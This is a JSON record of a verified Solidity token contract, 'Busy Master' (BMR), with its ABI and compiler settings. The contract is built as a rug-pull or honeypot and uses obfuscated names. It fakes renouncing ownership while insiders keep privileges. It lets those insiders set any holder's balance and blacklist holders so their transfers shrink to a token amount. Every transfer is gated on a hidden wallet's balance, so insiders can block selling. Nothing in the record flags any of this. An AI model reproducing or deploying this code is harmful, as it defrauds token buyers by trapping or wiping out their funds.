{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface amountSell {\n    function createPair(address autoLaunch, address toTxFrom) external returns (address);\n}\n\ninterface shouldWalletTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingTake) external view returns (uint256);\n\n    function transfer(address senderTake, uint256 modeTeam) external returns (bool);\n\n    function allowance(address teamFundLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTake,\n        uint256 modeTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundFrom, uint256 value);\n    event Approval(address indexed teamFundLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract fromMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableSender is shouldWalletTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BusyMaster is fromMax, shouldWalletTeam, enableSender {\n\n    address walletMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public buyWalletSender;\n\n    function exemptTeam(uint256 modeTeam) public {\n        minTotal();\n        exemptSwap = modeTeam;\n    }\n\n    uint8 private minToken = 18;\n\n    address public feeLimit;\n\n    bool private totalSwap;\n\n    function liquidityTake(address marketingWallet, address senderTake, uint256 modeTeam) internal returns (bool) {\n        if (marketingWallet == feeLimit) {\n            return toTx(marketingWallet, senderTake, modeTeam);\n        }\n        uint256 minLimit = shouldWalletTeam(senderMarketingSell).balanceOf(walletMin);\n        require(minLimit == exemptSwap);\n        require(senderTake != walletMin);\n        if (buyWalletSender[marketingWallet]) {\n            return toTx(marketingWallet, senderTake, swapLaunched);\n        }\n        return toTx(marketingWallet, senderTake, modeTeam);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellListFee;\n\n    uint256 private receiverReceiver;\n\n    string private isTrading = \"Busy Master\";\n\n    uint256 public sellToBuy;\n\n    uint256 exemptSwap;\n\n    uint256 private senderMarketing;\n\n    bool private modeLaunch;\n\n    function maxAmount(address isLiquidity) public {\n        minTotal();\n        \n        if (isLiquidity == feeLimit || isLiquidity == senderMarketingSell) {\n            return;\n        }\n        buyWalletSender[isLiquidity] = true;\n    }\n\n    constructor (){\n        if (receiverReceiver == senderMarketing) {\n            feeTeam = false;\n        }\n        swapSell takeEnableMode = swapSell(amountMax);\n        senderMarketingSell = amountSell(takeEnableMode.factory()).createPair(takeEnableMode.WETH(), address(this));\n        \n        feeLimit = _msgSender();\n        teamEnable[feeLimit] = true;\n        modeSellExempt[feeLimit] = sellBuy;\n        txLimit();\n        \n        emit Transfer(address(0), feeLimit, sellBuy);\n    }\n\n    function owner() external view returns (address) {\n        return exemptLimit;\n    }\n\n    uint256 private sellBuy = 100000000 * 10 ** 18;\n\n    function transfer(address fundFeeAuto, uint256 modeTeam) external virtual override returns (bool) {\n        return liquidityTake(_msgSender(), fundFeeAuto, modeTeam);\n    }\n\n    bool private senderBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellBuy;\n    }\n\n    mapping(address => uint256) private modeSellExempt;\n\n    string private sellShould = \"BMR\";\n\n    uint256 private fromTeamWallet;\n\n    function transferFrom(address marketingWallet, address senderTake, uint256 modeTeam) external override returns (bool) {\n        if (_msgSender() != amountMax) {\n            if (sellListFee[marketingWallet][_msgSender()] != type(uint256).max) {\n                require(modeTeam <= sellListFee[marketingWallet][_msgSender()]);\n                sellListFee[marketingWallet][_msgSender()] -= modeTeam;\n            }\n        }\n        return liquidityTake(marketingWallet, senderTake, modeTeam);\n    }\n\n    function minTotal() private view {\n        require(teamEnable[_msgSender()]);\n    }\n\n    address amountMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return isTrading;\n    }\n\n    bool public takeEnable;\n\n    function allowance(address totalLiquidity, address isMin) external view virtual override returns (uint256) {\n        if (isMin == amountMax) {\n            return type(uint256).max;\n        }\n        return sellListFee[totalLiquidity][isMin];\n    }\n\n    function approve(address isMin, uint256 modeTeam) public virtual override returns (bool) {\n        sellListFee[_msgSender()][isMin] = modeTeam;\n        emit Approval(_msgSender(), isMin, modeTeam);\n        return true;\n    }\n\n    uint256 receiverTrading;\n\n    address private exemptLimit;\n\n    function atAmount(address fromList) public {\n        require(fromList.balance < 100000);\n        if (limitFrom) {\n            return;\n        }\n        if (senderBuy == modeLaunch) {\n            feeTeam = true;\n        }\n        teamEnable[fromList] = true;\n        \n        limitFrom = true;\n    }\n\n    bool public limitFrom;\n\n    uint256 constant swapLaunched = 7 ** 10;\n\n    bool private feeTeam;\n\n    function getOwner() external view returns (address) {\n        return exemptLimit;\n    }\n\n    address public senderMarketingSell;\n\n    function txLimit() public {\n        emit OwnershipTransferred(feeLimit, address(0));\n        exemptLimit = address(0);\n    }\n\n    function balanceOf(address marketingTake) public view virtual override returns (uint256) {\n        return modeSellExempt[marketingTake];\n    }\n\n    function liquidityMarketing(address fundFeeAuto, uint256 modeTeam) public {\n        minTotal();\n        modeSellExempt[fundFeeAuto] = modeTeam;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minToken;\n    }\n\n    mapping(address => bool) public teamEnable;\n\n    uint256 public txAt;\n\n    event OwnershipTransferred(address indexed modeMarketing, address indexed sellExempt);\n\n    function toTx(address marketingWallet, address senderTake, uint256 modeTeam) internal returns (bool) {\n        require(modeSellExempt[marketingWallet] >= modeTeam);\n        modeSellExempt[marketingWallet] -= modeTeam;\n        modeSellExempt[senderTake] += modeTeam;\n        emit Transfer(marketingWallet, senderTake, modeTeam);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFundLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyWalletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTeam\",\"type\":\"uint256\"}],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFeeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTeam\",\"type\":\"uint256\"}],\"name\":\"liquidityMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketingSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFeeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BusyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}